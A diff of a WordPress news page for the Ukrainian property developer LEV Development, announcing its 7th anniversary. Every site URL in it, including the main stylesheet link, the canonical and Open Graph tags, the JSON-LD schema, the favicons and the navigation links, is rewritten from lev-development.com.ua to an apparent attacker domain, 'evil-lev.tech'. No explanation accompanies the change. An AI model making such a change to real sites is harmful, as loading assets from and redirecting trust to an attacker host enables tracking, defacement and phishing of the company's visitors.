@@ -54,20 +54,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
     <style>
     html{box-sizing:border-box;-ms-overflow-style:scrollbar}*,::after,::before{box-sizing:inherit}.container{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}@media (min-width:576px){.container{max-width:540px}}@media (min-width:768px){.container{max-width:720px}}@media (min-width:992px){.container{max-width:960px}}@media (min-width:1200px){.container{max-width:1140px}}.container-fluid{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}.row{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-15px;margin-left:-15px}.no-gutters{margin-right:0;margin-left:0}.no-gutters>.col,.no-gutters>[class*=col-]{padding-right:0;padding-left:0}.col,.col-1,.col-10,.col-11,.col-12,.col-2,.col-3,.col-4,.col-5,.col-6,.col-7,.col-8,.col-9,.col-auto,.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-auto,.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-auto,.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-auto,.col-xl,.col-xl-1,.col-xl-10,.col-xl-11,.col-xl-12,.col-xl-2,.col-xl-3,.col-xl-4,.col-xl-5,.col-xl-6,.col-xl-7,.col-xl-8,.col-xl-9,.col-xl-auto{position:relative;width:100%;padding-right:15px;padding-left:15px}.col{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.col-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-first{-ms-flex-order:-1;order:-1}.order-last{-ms-flex-order:13;order:13}.order-0{-ms-flex-order:0;order:0}.order-1{-ms-flex-order:1;order:1}.order-2{-ms-flex-order:2;order:2}.order-3{-ms-flex-order:3;order:3}.order-4{-ms-flex-order:4;order:4}.order-5{-ms-flex-order:5;order:5}.order-6{-ms-flex-order:6;order:6}.order-7{-ms-flex-order:7;order:7}.order-8{-ms-flex-order:8;order:8}.order-9{-ms-flex-order:9;order:9}.order-10{-ms-flex-order:10;order:10}.order-11{-ms-flex-order:11;order:11}.order-12{-ms-flex-order:12;order:12}.offset-1{margin-left:8.333333%}.offset-2{margin-left:16.666667%}.offset-3{margin-left:25%}.offset-4{margin-left:33.333333%}.offset-5{margin-left:41.666667%}.offset-6{margin-left:50%}.offset-7{margin-left:58.333333%}.offset-8{margin-left:66.666667%}.offset-9{margin-left:75%}.offset-10{margin-left:83.333333%}.offset-11{margin-left:91.666667%}@media (min-width:576px){.col-sm{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.col-sm-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-sm-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-sm-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-sm-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-sm-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-sm-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-sm-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-sm-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-sm-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-sm-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-sm-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-sm-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-sm-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-sm-first{-ms-flex-order:-1;order:-1}.order-sm-last{-ms-flex-order:13;order:13}.order-sm-0{-ms-flex-order:0;order:0}.order-sm-1{-ms-flex-order:1;order:1}.order-sm-2{-ms-flex-order:2;order:2}.order-sm-3{-ms-flex-order:3;order:3}.order-sm-4{-ms-flex-order:4;order:4}.order-sm-5{-ms-flex-order:5;order:5}.order-sm-6{-ms-flex-order:6;order:6}.order-sm-7{-ms-flex-order:7;order:7}.order-sm-8{-ms-flex-order:8;order:8}.order-sm-9{-ms-flex-order:9;order:9}.order-sm-10{-ms-flex-order:10;order:10}.order-sm-11{-ms-flex-order:11;order:11}.order-sm-12{-ms-flex-order:12;order:12}.offset-sm-0{margin-left:0}.offset-sm-1{margin-left:8.333333%}.offset-sm-2{margin-left:16.666667%}.offset-sm-3{margin-left:25%}.offset-sm-4{margin-left:33.333333%}.offset-sm-5{margin-left:41.666667%}.offset-sm-6{margin-left:50%}.offset-sm-7{margin-left:58.333333%}.offset-sm-8{margin-left:66.666667%}.offset-sm-9{margin-left:75%}.offset-sm-10{margin-left:83.333333%}.offset-sm-11{margin-left:91.666667%}}@media (min-width:768px){.col-md{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.col-md-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-md-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-md-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-md-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-md-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-md-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-md-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-md-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-md-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-md-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-md-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-md-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-md-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-md-first{-ms-flex-order:-1;order:-1}.order-md-last{-ms-flex-order:13;order:13}.order-md-0{-ms-flex-order:0;order:0}.order-md-1{-ms-flex-order:1;order:1}.order-md-2{-ms-flex-order:2;order:2}.order-md-3{-ms-flex-order:3;order:3}.order-md-4{-ms-flex-order:4;order:4}.order-md-5{-ms-flex-order:5;order:5}.order-md-6{-ms-flex-order:6;order:6}.order-md-7{-ms-flex-order:7;order:7}.order-md-8{-ms-flex-order:8;order:8}.order-md-9{-ms-flex-order:9;order:9}.order-md-10{-ms-flex-order:10;order:10}.order-md-11{-ms-flex-order:11;order:11}.order-md-12{-ms-flex-order:12;order:12}.offset-md-0{margin-left:0}.offset-md-1{margin-left:8.333333%}.offset-md-2{margin-left:16.666667%}.offset-md-3{margin-left:25%}.offset-md-4{margin-left:33.333333%}.offset-md-5{margin-left:41.666667%}.offset-md-6{margin-left:50%}.offset-md-7{margin-left:58.333333%}.offset-md-8{margin-left:66.666667%}.offset-md-9{margin-left:75%}.offset-md-10{margin-left:83.333333%}.offset-md-11{margin-left:91.666667%}}@media (min-width:992px){.col-lg{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.col-lg-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-lg-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-lg-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-lg-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-lg-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-lg-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-lg-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-lg-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-lg-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-lg-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-lg-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-lg-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-lg-first{-ms-flex-order:-1;order:-1}.order-lg-last{-ms-flex-order:13;order:13}.order-lg-0{-ms-flex-order:0;order:0}.order-lg-1{-ms-flex-order:1;order:1}.order-lg-2{-ms-flex-order:2;order:2}.order-lg-3{-ms-flex-order:3;order:3}.order-lg-4{-ms-flex-order:4;order:4}.order-lg-5{-ms-flex-order:5;order:5}.order-lg-6{-ms-flex-order:6;order:6}.order-lg-7{-ms-flex-order:7;order:7}.order-lg-8{-ms-flex-order:8;order:8}.order-lg-9{-ms-flex-order:9;order:9}.order-lg-10{-ms-flex-order:10;order:10}.order-lg-11{-ms-flex-order:11;order:11}.order-lg-12{-ms-flex-order:12;order:12}.offset-lg-0{margin-left:0}.offset-lg-1{margin-left:8.333333%}.offset-lg-2{margin-left:16.666667%}.offset-lg-3{margin-left:25%}.offset-lg-4{margin-left:33.333333%}.offset-lg-5{margin-left:41.666667%}.offset-lg-6{margin-left:50%}.offset-lg-7{margin-left:58.333333%}.offset-lg-8{margin-left:66.666667%}.offset-lg-9{margin-left:75%}.offset-lg-10{margin-left:83.333333%}.offset-lg-11{margin-left:91.666667%}}@media (min-width:1200px){.col-xl{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.col-xl-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-xl-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-xl-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-xl-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-xl-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-xl-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-xl-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-xl-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-xl-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-xl-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-xl-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-xl-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-xl-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-xl-first{-ms-flex-order:-1;order:-1}.order-xl-last{-ms-flex-order:13;order:13}.order-xl-0{-ms-flex-order:0;order:0}.order-xl-1{-ms-flex-order:1;order:1}.order-xl-2{-ms-flex-order:2;order:2}.order-xl-3{-ms-flex-order:3;order:3}.order-xl-4{-ms-flex-order:4;order:4}.order-xl-5{-ms-flex-order:5;order:5}.order-xl-6{-ms-flex-order:6;order:6}.order-xl-7{-ms-flex-order:7;order:7}.order-xl-8{-ms-flex-order:8;order:8}.order-xl-9{-ms-flex-order:9;order:9}.order-xl-10{-ms-flex-order:10;order:10}.order-xl-11{-ms-flex-order:11;order:11}.order-xl-12{-ms-flex-order:12;order:12}.offset-xl-0{margin-left:0}.offset-xl-1{margin-left:8.333333%}.offset-xl-2{margin-left:16.666667%}.offset-xl-3{margin-left:25%}.offset-xl-4{margin-left:33.333333%}.offset-xl-5{margin-left:41.666667%}.offset-xl-6{margin-left:50%}.offset-xl-7{margin-left:58.333333%}.offset-xl-8{margin-left:66.666667%}.offset-xl-9{margin-left:75%}.offset-xl-10{margin-left:83.333333%}.offset-xl-11{margin-left:91.666667%}}.d-none{display:none!important}.d-inline{display:inline!important}.d-inline-block{display:inline-block!important}.d-block{display:block!important}.d-table{display:table!important}.d-table-row{display:table-row!important}.d-table-cell{display:table-cell!important}.d-flex{display:-ms-flexbox!important;display:flex!important}.d-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}@media (min-width:576px){.d-sm-none{display:none!important}.d-sm-inline{display:inline!important}.d-sm-inline-block{display:inline-block!important}.d-sm-block{display:block!important}.d-sm-table{display:table!important}.d-sm-table-row{display:table-row!important}.d-sm-table-cell{display:table-cell!important}.d-sm-flex{display:-ms-flexbox!important;display:flex!important}.d-sm-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}}@media (min-width:768px){.d-md-none{display:none!important}.d-md-inline{display:inline!important}.d-md-inline-block{display:inline-block!important}.d-md-block{display:block!important}.d-md-table{display:table!important}.d-md-table-row{display:table-row!important}.d-md-table-cell{display:table-cell!important}.d-md-flex{display:-ms-flexbox!important;display:flex!important}.d-md-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}}@media (min-width:992px){.d-lg-none{display:none!important}.d-lg-inline{display:inline!important}.d-lg-inline-block{display:inline-block!important}.d-lg-block{display:block!important}.d-lg-table{display:table!important}.d-lg-table-row{display:table-row!important}.d-lg-table-cell{display:table-cell!important}.d-lg-flex{display:-ms-flexbox!important;display:flex!important}.d-lg-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}}@media (min-width:1200px){.d-xl-none{display:none!important}.d-xl-inline{display:inline!important}.d-xl-inline-block{display:inline-block!important}.d-xl-block{display:block!important}.d-xl-table{display:table!important}.d-xl-table-row{display:table-row!important}.d-xl-table-cell{display:table-cell!important}.d-xl-flex{display:-ms-flexbox!important;display:flex!important}.d-xl-inline-flex{display:-ms-inline-flexbox!important;display:inline-flex!important}}.w-100{width:100%!important}
-</style>    <link href="https://lev-development.com.ua/wp-content/themes/lev/css/main.css.pagespeed.ce.qzM-IoVV7t.css" rel="stylesheet" type="text/css"/>
+</style>    <link href="https://evil-lev.tech/wp-content/themes/lev/css/main.css.pagespeed.ce.qzM-IoVV7t.css" rel="stylesheet" type="text/css"/>
     <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1'/>
 
 	<!-- This site is optimized with the Yoast SEO plugin v19.13 - https://yoast.com/wordpress/plugins/seo/ -->
 	<title>LEV Development святкує 7-ми річчя 🎉 - LEV Development</title>
-	<link rel="canonical" href="https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-🎉/"/>
+	<link rel="canonical" href="https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-🎉/"/>
 	<meta property="og:locale" content="uk_UA"/>
 	<meta property="og:type" content="article"/>
 	<meta property="og:title" content="LEV Development святкує 7-ми річчя 🎉"/>
-	<meta property="og:url" content="https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-🎉/"/>
+	<meta property="og:url" content="https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-🎉/"/>
 	<meta property="og:site_name" content="LEV Development"/>
 	<meta property="article:published_time" content="2022-09-30T06:00:57+00:00"/>
 	<meta property="article:modified_time" content="2022-10-05T09:51:59+00:00"/>
-	<meta property="og:image" content="http://lev-development.com.ua/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya.jpg"/>
+	<meta property="og:image" content="http://evil-lev.tech/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya.jpg"/>
 	<meta property="og:image:width" content="1200"/>
 	<meta property="og:image:height" content="630"/>
 	<meta property="og:image:type" content="image/jpeg"/>
@@ -75,20 +75,20 @@
 	<meta name="twitter:card" content="summary_large_image"/>
 	<meta name="twitter:label1" content="Написано"/>
 	<meta name="twitter:data1" content="lev-development"/>
-	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/","url":"https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/","name":"[:uk]LEV Development святкує 7-ми річчя 🎉[:en]LEV DEVELOPMENT IS CELEBRATING ITS 7TH ANNIVERSARY 🎉[:] - LEV Development","isPartOf":{"@id":"https://lev-development.com.ua/#website"},"primaryImageOfPage":{"@id":"https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/#primaryimage"},"image":{"@id":"https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/#primaryimage"},"thumbnailUrl":"https://lev-development.com.ua/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya.jpg","datePublished":"2022-09-30T06:00:57+00:00","dateModified":"2022-10-05T09:51:59+00:00","author":{"@id":"https://lev-development.com.ua/#/schema/person/e4a1717012c59d69b41497187190b895"},"breadcrumb":{"@id":"https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/#breadcrumb"},"inLanguage":"uk","potentialAction":[{"@type":"ReadAction","target":["https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/"]}]},{"@type":"ImageObject","inLanguage":"uk","@id":"https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/#primaryimage","url":"https://lev-development.com.ua/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya.jpg","contentUrl":"https://lev-development.com.ua/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya.jpg","width":1200,"height":630},{"@type":"BreadcrumbList","@id":"https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Головна Сторінка","item":"https://lev-development.com.ua/en/"},{"@type":"ListItem","position":2,"name":"Новини","item":"https://lev-development.com.ua/novyny/"},{"@type":"ListItem","position":3,"name":"LEV DEVELOPMENT IS CELEBRATING ITS 7TH ANNIVERSARY 🎉"}]},{"@type":"WebSite","@id":"https://lev-development.com.ua/#website","url":"https://lev-development.com.ua/","name":"LEV Development","description":"Продаж квартир та інвестиційної нерухомості","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://lev-development.com.ua/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"uk"},{"@type":"Person","@id":"https://lev-development.com.ua/#/schema/person/e4a1717012c59d69b41497187190b895","name":"lev-development","image":{"@type":"ImageObject","inLanguage":"uk","@id":"https://lev-development.com.ua/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/3d2b860c47b31a62b79960923d51d651?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/3d2b860c47b31a62b79960923d51d651?s=96&d=mm&r=g","caption":"lev-development"}}]}</script>
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/","url":"https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/","name":"[:uk]LEV Development святкує 7-ми річчя 🎉[:en]LEV DEVELOPMENT IS CELEBRATING ITS 7TH ANNIVERSARY 🎉[:] - LEV Development","isPartOf":{"@id":"https://evil-lev.tech/#website"},"primaryImageOfPage":{"@id":"https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/#primaryimage"},"image":{"@id":"https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/#primaryimage"},"thumbnailUrl":"https://evil-lev.tech/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya.jpg","datePublished":"2022-09-30T06:00:57+00:00","dateModified":"2022-10-05T09:51:59+00:00","author":{"@id":"https://evil-lev.tech/#/schema/person/e4a1717012c59d69b41497187190b895"},"breadcrumb":{"@id":"https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/#breadcrumb"},"inLanguage":"uk","potentialAction":[{"@type":"ReadAction","target":["https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/"]}]},{"@type":"ImageObject","inLanguage":"uk","@id":"https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/#primaryimage","url":"https://evil-lev.tech/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya.jpg","contentUrl":"https://evil-lev.tech/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya.jpg","width":1200,"height":630},{"@type":"BreadcrumbList","@id":"https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Головна Сторінка","item":"https://evil-lev.tech/en/"},{"@type":"ListItem","position":2,"name":"Новини","item":"https://evil-lev.tech/novyny/"},{"@type":"ListItem","position":3,"name":"LEV DEVELOPMENT IS CELEBRATING ITS 7TH ANNIVERSARY 🎉"}]},{"@type":"WebSite","@id":"https://evil-lev.tech/#website","url":"https://evil-lev.tech/","name":"LEV Development","description":"Продаж квартир та інвестиційної нерухомості","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://evil-lev.tech/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"uk"},{"@type":"Person","@id":"https://evil-lev.tech/#/schema/person/e4a1717012c59d69b41497187190b895","name":"lev-development","image":{"@type":"ImageObject","inLanguage":"uk","@id":"https://evil-lev.tech/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/3d2b860c47b31a62b79960923d51d651?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/3d2b860c47b31a62b79960923d51d651?s=96&d=mm&r=g","caption":"lev-development"}}]}</script>
 	<!-- / Yoast SEO plugin. -->
 
 
-<link rel="https://api.w.org/" href="https://lev-development.com.ua/wp-json/"/><link rel="alternate" type="application/json" href="https://lev-development.com.ua/wp-json/wp/v2/posts/9803"/><link rel="alternate" type="application/json+oembed" href="https://lev-development.com.ua/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flev-development.com.ua%2Flev-development-svyatkuye-7-my-richchya-%25f0%259f%258e%2589%2F"/>
-<link rel="alternate" type="text/xml+oembed" href="https://lev-development.com.ua/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flev-development.com.ua%2Flev-development-svyatkuye-7-my-richchya-%25f0%259f%258e%2589%2F&#038;format=xml"/>
-<link rel="alternate" hreflang="x-default" href="https://lev-development.com.ua/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/"/>
-<link rel="alternate" hreflang="uk" href="https://lev-development.com.ua/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/"/>
-<link rel="alternate" hreflang="en-gb" href="https://lev-development.com.ua/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/"/>
-<meta property="og:site_name" content="LEV Development"><meta property="og:title" content="LEV Development святкує 7-ми річчя 🎉"><meta property="og:url" content="https://lev-development.com.ua/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/"><meta property="og:image" content="https://lev-development.com.ua/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya.jpg"><link rel="icon" href="https://lev-development.com.ua/wp-content/uploads/2021/12/favicon.svg" sizes="32x32"/>
-<link rel="icon" href="https://lev-development.com.ua/wp-content/uploads/2021/12/favicon.svg" sizes="192x192"/>
-<link rel="apple-touch-icon" href="https://lev-development.com.ua/wp-content/uploads/2021/12/favicon.svg"/>
-<meta name="msapplication-TileImage" content="https://lev-development.com.ua/wp-content/uploads/2021/12/favicon.svg"/>
-    <link rel="shortcut icon" href="https://lev-development.com.ua/wp-content/themes/lev/img/favicon.ico"/>
+<link rel="https://api.w.org/" href="https://evil-lev.tech/wp-json/"/><link rel="alternate" type="application/json" href="https://evil-lev.tech/wp-json/wp/v2/posts/9803"/><link rel="alternate" type="application/json+oembed" href="https://evil-lev.tech/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fevil-lev.tech%2Flev-development-svyatkuye-7-my-richchya-%25f0%259f%258e%2589%2F"/>
+<link rel="alternate" type="text/xml+oembed" href="https://evil-lev.tech/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fevil-lev.tech%2Flev-development-svyatkuye-7-my-richchya-%25f0%259f%258e%2589%2F&#038;format=xml"/>
+<link rel="alternate" hreflang="x-default" href="https://evil-lev.tech/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/"/>
+<link rel="alternate" hreflang="uk" href="https://evil-lev.tech/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/"/>
+<link rel="alternate" hreflang="en-gb" href="https://evil-lev.tech/en/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/"/>
+<meta property="og:site_name" content="LEV Development"><meta property="og:title" content="LEV Development святкує 7-ми річчя 🎉"><meta property="og:url" content="https://evil-lev.tech/lev-development-svyatkuye-7-my-richchya-%f0%9f%8e%89/"><meta property="og:image" content="https://evil-lev.tech/wp-content/uploads/2022/10/7ye-vidnovleno_-kopiya.jpg"><link rel="icon" href="https://evil-lev.tech/wp-content/uploads/2021/12/favicon.svg" sizes="32x32"/>
+<link rel="icon" href="https://evil-lev.tech/wp-content/uploads/2021/12/favicon.svg" sizes="192x192"/>
+<link rel="apple-touch-icon" href="https://evil-lev.tech/wp-content/uploads/2021/12/favicon.svg"/>
+<meta name="msapplication-TileImage" content="https://evil-lev.tech/wp-content/uploads/2021/12/favicon.svg"/>
+    <link rel="shortcut icon" href="https://evil-lev.tech/wp-content/themes/lev/img/favicon.ico"/>
 
 </head>
 
@@ -117,59 +117,59 @@
 
     <div id="content-block">
                 <header class="">
-            <a href="https://lev-development.com.ua/" id="logo">
-                <img src="" data-src="https://lev-development.com.ua/wp-content/themes/lev/img/lev-logo-white.svg" alt="logo">
+            <a href="https://evil-lev.tech/" id="logo">
+                <img src="" data-src="https://evil-lev.tech/wp-content/themes/lev/img/lev-logo-white.svg" alt="logo">
             </a>
             <div class="h-inner">
                 <nav>
                     <ul>
-                        <li><a class="" href="https://lev-development.com.ua/proekty/">Проєкти</a></li><li><a class="" href="https://lev-development.com.ua/akcziyi/">Акції</a></li><li><a class="" href="https://lev-development.com.ua/novyny/">Новини</a></li><li><a class="" href="https://lev-development.com.ua/kontakty/">Контакти</a></li>                    </ul>
+                        <li><a class="" href="https://evil-lev.tech/proekty/">Проєкти</a></li><li><a class="" href="https://evil-lev.tech/akcziyi/">Акції</a></li><li><a class="" href="https://evil-lev.tech/novyny/">Новини</a></li><li><a class="" href="https://evil-lev.tech/kontakty/">Контакти</a></li>                    </ul>
 
                     <ul class="full-menu">
                                                         <li>
-                                    <a href="https://lev-development.com.ua/pro-nas/" class="t-move-wrap ">
+                                    <a href="https://evil-lev.tech/pro-nas/" class="t-move-wrap ">
                                         <span class="img-enter">
-                                            <span class="bg-full" data-bg-xl-late="https://lev-development.com.ua/wp-content/uploads/2022/01/image_part_001-450x966.jpg"></span>
+                                            <span class="bg-full" data-bg-xl-late="https://evil-lev.tech/wp-content/uploads/2022/01/image_part_001-450x966.jpg"></span>
                                         </span>
                                         <span class="h3 t-move-to-copy">Про нас</span>
                                     </a>
                                 </li>
                                                         <li>
-                                    <a href="https://lev-development.com.ua/lev-club/" class="t-move-wrap ">
+                                    <a href="https://evil-lev.tech/lev-club/" class="t-move-wrap ">
                                         <span class="img-enter">
-                                            <span class="bg-full" data-bg-xl-late="https://lev-development.com.ua/wp-content/uploads/2022/01/image_part_002-450x966.jpg"></span>
+                                            <span class="bg-full" data-bg-xl-late="https://evil-lev.tech/wp-content/uploads/2022/01/image_part_002-450x966.jpg"></span>
                                         </span>
                                         <span class="h3 t-move-to-copy">LEV Club</span>
                                     </a>
                                 </li>
                                                         <li>
-                                    <a href="https://lev-development.com.ua/servicehouse/" class="t-move-wrap ">
+                                    <a href="https://evil-lev.tech/servicehouse/" class="t-move-wrap ">
                                         <span class="img-enter">
